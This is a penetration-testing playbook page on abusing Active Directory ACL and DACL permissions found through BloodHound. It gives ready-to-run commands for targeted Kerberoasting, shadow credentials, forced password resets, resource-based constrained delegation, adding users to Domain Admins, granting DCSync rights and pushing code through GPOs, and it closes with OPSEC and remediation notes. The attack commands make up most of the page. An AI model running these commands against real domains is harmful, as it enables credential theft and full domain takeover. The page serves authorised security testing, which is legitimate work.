# Stage 4 — ACL / DACL & Object Abuse

BloodHound surfaces these as edges. Each abusable ACL is a concrete privesc step.
Always **restore** ACLs/attributes you modify and document the change.

## The edges and how to abuse them

**GenericAll / GenericWrite over a USER**
- Set an SPN → Kerberoast (targeted):
```bash
targetedKerberoast.py -v -d corp.local -u user -p pass   # auto SPN→roast→cleanup
```
- Or **shadow credentials** (msDS-KeyCredentialLink) — no password reset needed:
```bash
certipy shadow auto -u user@corp.local -p pass -account victimuser
# -> NT hash / TGT of victim, silently, and cleans up
pywhisker -d corp.local -u user -p pass --target victim --action add
```
- Or force a password change (see below).

**ForceChangePassword over a USER** — reset their password (noisy, disrupts user):
```bash
nxc ldap <DC> -u user -p pass -M change-password -o TARGET=victim NEWPASS='P@ss123!'
bloodyAD -u user -p pass -d corp.local --host <DC> set password victim 'P@ss123!'
```
Prefer shadow credentials/targeted-kerberoast over resets when the account is in use.

**GenericAll / GenericWrite over a COMPUTER** — configure **RBCD** to impersonate
any user on that host (see delegation-and-coercion.md), or add shadow creds to the
computer:
```bash
rbcd.py -delegate-to 'TARGET$' -from 'ATTACKER$' -action write corp.local/user:pass
```

**GenericAll over a GROUP / AddMember** — add yourself to a privileged group:
```bash
bloodyAD -u user -p pass -d corp.local --host <DC> add groupMember 'Domain Admins' user
net rpc group addmem "Domain Admins" user -U corp.local/user%pass -S <DC>
```

**WriteDACL / WriteOwner over any object** — grant yourself full control, then
apply one of the above. Classic escalation to the domain object → grant DCSync:
```bash
# take ownership then add DCSync rights
owneredit.py -action write -new-owner user -target-dn '<objDN>' corp.local/user:pass
dacledit.py -action write -rights DCSync -principal user -target-dn 'DC=corp,DC=local' corp.local/user:pass
```

**WriteDACL/GenericAll over the DOMAIN root → DCSync** → dump all hashes
(credential-access.md).

**AddKeyCredentialLink** — shadow credentials (as above), the quietest takeover.

**AddSelf / Self-membership** — add yourself to the group directly.

**GPO edit rights (WriteGPO / GPLink)** — see GPO abuse below.

## GPO abuse
If you can edit a GPO linked to a target OU (BloodHound edge `GPLink`/write on GPO):
```bash
pygpoabuse corp.local -u user -p pass --gpo-id <GUID> --command 'add user'   # scheduled task
# SharpGPOAbuse on Windows: add local admin / immediate scheduled task / logon script
```
Impact: run code on every computer/user in the linked OU. High blast radius —
scope the command narrowly and clean up.

## Chaining
Typical BloodHound chain: `user → GenericWrite → svc (roast) → crack → ForceChangePassword → helpdesk → MemberOf → DA`, or `user → WriteDACL → domain → DCSync`.

## OPSEC
DACL/owner changes and group additions are logged (4662/4670/4728/4732/5136).
Restore every modification; keep additions short-lived; note them in the report.

## Remediation to recommend
Audit and remove excessive ACLs (Tiered admin model, least privilege); monitor
DACL/owner writes on privileged objects and the domain root; alert on
`msDS-KeyCredentialLink` writes; restrict who can edit GPOs and where they're
linked; use protected groups / AdminSDHolder correctly.
